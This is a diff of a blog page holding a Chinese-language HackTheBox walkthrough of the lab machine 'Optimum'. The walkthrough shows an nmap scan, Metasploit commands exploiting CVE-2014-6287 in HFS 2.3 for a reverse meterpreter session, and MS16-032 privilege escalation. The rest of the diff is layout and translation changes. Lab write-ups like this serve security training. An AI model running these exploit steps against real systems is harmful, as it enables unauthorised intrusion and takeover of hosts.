@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;6  10.10.10.8                                                                                                              端口扫描只有一个80: 123456789101">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;6  10.10.10.8   端口扫描只有一个80: 12345678910111213$ nmap -sC -sV 10.10.10.8Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2020-12-08 14:00 CSTNmap scan repo">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Optimum - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/01/28/Optimum-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;6  10.10.10.8                                                                                                              端口扫描只有一个80: 123456789101">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;6  10.10.10.8   端口扫描只有一个80: 12345678910111213$ nmap -sC -sV 10.10.10.8Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2020-12-08 14:00 CSTNmap scan repo">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120803.jpg">
@@ -117,8 +117,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -140,7 +147,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -208,26 +215,12 @@
 </li>
 <li><h2 id="10-10-10-8"><a href="#10-10-10-8" class="headerlink" title="10.10.10.8"></a>10.10.10.8</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120801.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120801.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>只有一个80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.8</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-08 14:00 CST</span><br><span class="line">Nmap scan report for 10.10.10.8</span><br><span class="line">Host is up (0.071s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    HttpFileServer httpd 2.3</span><br><span class="line">|_http-server-header: HFS 2.3</span><br><span class="line">|_http-title: HFS /</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 56.89 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>是一个HFS 2.3:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120802.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120802.jpg" alt=""></p>
 <p>搜索得到相关漏洞：</p>
 <ul>
 <li>Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) - Windows webapps Exploit<br><a href="https://www.exploit-db.com/exploits/49125" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49125</a></li>
@@ -235,55 +228,20 @@
 <h1 id="CVE-2014-6287"><a href="#CVE-2014-6287" class="headerlink" title="CVE-2014-6287"></a>CVE-2014-6287</h1><p>直接msf一键打：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;http&#x2F;rejetto_hfs_exec</span><br><span class="line">set rhosts 10.10.10.8</span><br><span class="line">set lhost 10.10.14.5</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : OPTIMUM</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : el_GR</span><br><span class="line">Domain          : HTB</span><br><span class="line">Logged On Users : 1</span><br><span class="line">Meterpreter     : x86&#x2F;windows</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120803.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120803.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>直接当前用户桌面得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120804.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120804.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>直接msf收集信息：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure>
 
 <p>得到结果，ms16-032:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120805.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120805.jpg" alt=""></p>
 <h1 id="ms16-032"><a href="#ms16-032" class="headerlink" title="ms16_032"></a>ms16_032</h1><p>还是msf一键打，打到system shell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120806.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120806.jpg" alt=""></p>
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>Administrator用户桌面得到root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120807.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120807.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) - Windows webapps Exploit<br><a href="https://www.exploit-db.com/exploits/49125" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49125</a></li>
 <li><a href="https://www.hackthebox.eu/home/machines/writeup/6" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/6</a></li>
@@ -297,7 +255,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-12-08T06:25:02.672Z" itemprop="dateUpdated">2020-12-08 14:25:02</time>
+    Last updated: <time datetime="2020-12-08T06:25:02.672Z" itemprop="dateUpdated">2020-12-08 14:25:02</time>
 </span><br>
 
 
@@ -464,11 +422,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
